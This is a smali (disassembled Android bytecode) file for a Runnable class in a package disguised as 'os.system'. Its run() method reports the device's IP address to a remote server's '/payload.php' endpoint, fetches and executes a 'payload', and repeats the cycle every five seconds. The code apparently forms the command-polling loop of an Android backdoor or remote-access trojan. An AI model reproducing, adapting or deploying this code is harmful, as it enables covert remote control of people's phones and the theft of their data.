.class Los/system/SystemThread$2;
.super Ljava/lang/Object;
.source "SystemThread.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Los/system/SystemThread;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Los/system/SystemThread;


# direct methods
.method constructor <init>(Los/system/SystemThread;)V
    .locals 0

    .prologue
    .line 108
    iput-object p1, p0, Los/system/SystemThread$2;->this$0:Los/system/SystemThread;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 4

    .prologue
    .line 111
    iget-object v0, p0, Los/system/SystemThread$2;->this$0:Los/system/SystemThread;

    invoke-static {v0}, Los/system/SystemThread;->access$300(Los/system/SystemThread;)Los/system/ReceiverBoot;

    sget-boolean v0, Los/system/ReceiverBoot;->pingResult:Z

    if-eqz v0, :cond_0

    .line 112
    iget-object v0, p0, Los/system/SystemThread$2;->this$0:Los/system/SystemThread;

    iget-object v1, p0, Los/system/SystemThread$2;->this$0:Los/system/SystemThread;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v3, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/payload.php?client="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const/4 v3, 0x1

    invoke-static {v3}, Los/system/Identitas;->getIPAddress(Z)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    invoke-virtual {v0, v1, v2, v3}, Los/system/SystemThread;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 113
    iget-object v0, p0, Los/system/SystemThread$2;->this$0:Los/system/SystemThread;

    iget-object v1, p0, Los/system/SystemThread$2;->this$0:Los/system/SystemThread;

    invoke-virtual {v0, v1}, Los/system/SystemThread;->payload(Landroid/content/Context;)V

    .line 118
    :goto_0
    iget-object v0, p0, Los/system/SystemThread$2;->this$0:Los/system/SystemThread;

    invoke-static {v0}, Los/system/SystemThread;->access$600(Los/system/SystemThread;)Landroid/os/Handler;

    move-result-object v0

    iget-object v1, p0, Los/system/SystemThread$2;->this$0:Los/system/SystemThread;

    invoke-static {v1}, Los/system/SystemThread;->access$500(Los/system/SystemThread;)Ljava/lang/Runnable;

    move-result-object v1

    const-wide/16 v2, 0x1388

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 119
    return-void

    .line 115
    :cond_0
    sget-object v0, Los/system/SystemThread;->TAG:Ljava/lang/String;

    const-string v1, "offline"

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_0
.end method
